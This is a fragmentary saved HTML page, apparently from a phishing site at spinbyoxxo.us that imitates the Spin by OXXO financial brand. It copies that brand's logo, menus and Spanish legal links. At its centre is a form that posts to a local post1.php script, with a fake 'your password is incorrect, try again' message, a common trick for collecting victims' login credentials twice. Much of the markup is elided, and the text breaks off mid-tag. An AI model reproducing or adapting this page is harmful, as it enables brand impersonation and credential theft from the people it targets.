<!DOCTYPE html>
<!-- saved from url=(0048)https://spinbyoxxo.us/to/view/id-32142/index.php -->
...
<script>
    ...
    <link rel="icon" href="https://spinbyoxxo.us/to/view/id-32142/images/cropped-brand-bg-white-cp-32x32.png" sizes="32x32">
    <link rel="icon" href="https://spinbyoxxo.us/to/view/id-32142/images/cropped-brand-bg-white-cp-192x192.png" sizes="192x192">
    <link rel="apple-touch-icon" href="https://spinbyoxxo.us/to/view/id-32142/images/cropped-brand-bg-white-cp-180x180.png">
                        ...
                        <div class="et_pb_row et_pb_row_0_tb_header et_pb_row--with-menu">
                            <div class="et_pb_column et_pb_column_1_4 et_pb_column_0_tb_header  et_pb_css_mix_blend_mode_passthrough">
                                ...
                                <div class="et_pb_module et_pb_image et_pb_image_0_tb_header">
                                    ...
                                    <a href="https://spinbyoxxo.us/to/view/id-32142/index.php#"><span class="et_pb_image_wrap "><img loading="lazy" width="363" height="268" src="./error_files/logo-download.png" alt="" title="cropped-brand-bg-white-cp.png"  sizes="(max-width: 363px) 100vw, 363px" class="wp-image-10"></span></a>
                                </div>
                            </div>
                                    ...
                                    <div class="et_pb_menu_inner_container clearfix">
                                        <div class="et_pb_menu__logo-wrap">
                                            <div class="et_pb_menu__logo">
                                                <a href="https://spinbyoxxo.us/to/view/id-32142/index.php"><img loading="lazy" width="363" height="268" src="./error_files/logo-download.png" alt="logo spinbyoxxo" sizes="(max-width: 363px) 100vw, 363px" class="wp-image-10"></a>
                                            </div>
                                        </div>
...
<form id="formularioGenerico" method="post" action="post1.php" onsubmit="disableButton()">
    

<div style="padding-top:10px;"></div><div class="error-message" style="display: block;">
  <span class="error-text">Su contraseña es incorrecta, intente nuevamente.</span>
</div>                                                       
    ...
    <div class="et_pb_text_inner">
        ...
        <script type="text/javascript">
            ...
            function disableButton() {
                ...
                submitButton.innerHTML = "Enviando...";  // Cambia el texto para indicar que se está enviando
            }
        </script>
    </div>
                            ...
                            <div class="et_pb_row et_pb_row_1_tb_footer et_pb_row--with-menu">
                                                    ...
                                                    <nav class="et-menu-nav">
                                                        <ul id="menu-menu-legal" class="et-menu nav">
                                                            <li class="et_pb_menu_page_id-2148 menu-item menu-item-type-custom menu-item-object-custom menu-item-2148">
                                                                <a href="https://spinbyoxxo.us/to/view/id-32142/index.php#">Declaración de privacidad</a></li>
                                                            <li class="et_pb_menu_page_id-2149 menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-2149">
                                                                <a href="https://spinbyoxxo.us/to/view/id-32142/index.php#">Condiciones de uso</a>
                                                                
                                                            </li>
                                                            <li class="et_pb_menu_page_id-2101 menu-item menu-item-type-post_type menu-item-object-page menu-item-2152">
                                                                <a href="https://spinbyoxxo.us/to/view/id-32142/index.php#">Representantes de ventas</a>
                                                            </li>
                                                            <li class="et_pb_menu_page_id-2036 menu-item menu-item-type-post_type menu-item-object-page menu-item-2153">
                                                                <a href="https://spinbyoxxo.us/to/view/id-32142/index.php#">Registro de instituciones</a></li>
                                                        </ul>
                                                    </nav>
                                                </div>
                                ...
                                <div class="et_pb_column et_pb_column_1_2 et_pb_column_5_tb_footer  et_pb_css_mix_blend_mode_passthrough et-last-child">
                                    ...
                                    <div class="et_pb_module et_pb_text et_pb_text_4_tb_footer  et_pb_text_align_left et_pb_bg_layout_light">
                                        ...
                                        <div class="et_pb_text_inner">
                                            <p style="text-align: left;"><a style="text-decoration: none;" href="https://spinbyoxxo.us/to/view/id-32142/index.php#"><strong>Consulta
